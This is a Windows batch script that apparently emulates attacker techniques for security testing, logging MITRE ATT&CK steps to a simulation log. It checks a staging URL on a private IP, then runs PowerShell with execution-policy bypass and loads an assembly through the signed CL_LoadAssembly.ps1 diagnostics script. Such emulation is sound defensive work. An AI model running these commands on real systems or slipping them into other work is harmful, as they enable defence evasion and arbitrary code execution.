@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=DUMMY
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?7572-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=control.txt
SET ewjmdkff=7572

REM Computed values
SET ghrten=%APPDATA%\!pudaazx!
SET bwefrl=!ghrten!\macula-simulations.log
SET ytjhdm=Audio
SET pdezk=C:\Windows\diagnostics\system\!ytjhdm!

REM 1. Check server availability (T1105)
SET etgn=0
SET pqmzdr=
curl -k -s -o nul !drguvr! && (SET etgn=1) || (SET pqmzdr=connection_refused)

REM Build timestamp
SET pjthn=!DATE:~-4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME:~0,2!\!TIME:~3,2!\!TIME:~6,2!.!TIME:~9,2!
SET pjthn=!pjthn: =0!

REM Log T1105
(echo [!pjthn!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1105^|Ingress Tool Transfer=!etgn!:!pqmzdr!) >> "!bwefrl!" 2>nul || rem

REM Exit if server check failed
IF !etgn! EQU 0 exit /b

REM 2. Execute assembly (T1218)
SET etgn=0
SET pqmzdr=
powershell.exe -ep bypass -command "set-location -path '!pdezk!'; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath '!pjkcpgw!\!syjfr!';[Program]::Dale()" && (SET etgn=1) || (SET pqmzdr=assembly_load_failed)

REM Build timestamp again
SET pjthn=!DATE:~-4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME:~0,2!\!TIME:~3,2!\!TIME:~6,2!.!TIME:~9,2!
SET pjthn=!pjthn: =0!

REM Log T1218
(echo [!pjthn!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218^|Signed Binary Proxy Execution=!etgn!:!pqmzdr!) >> "!bwefrl!" 2>nul || rem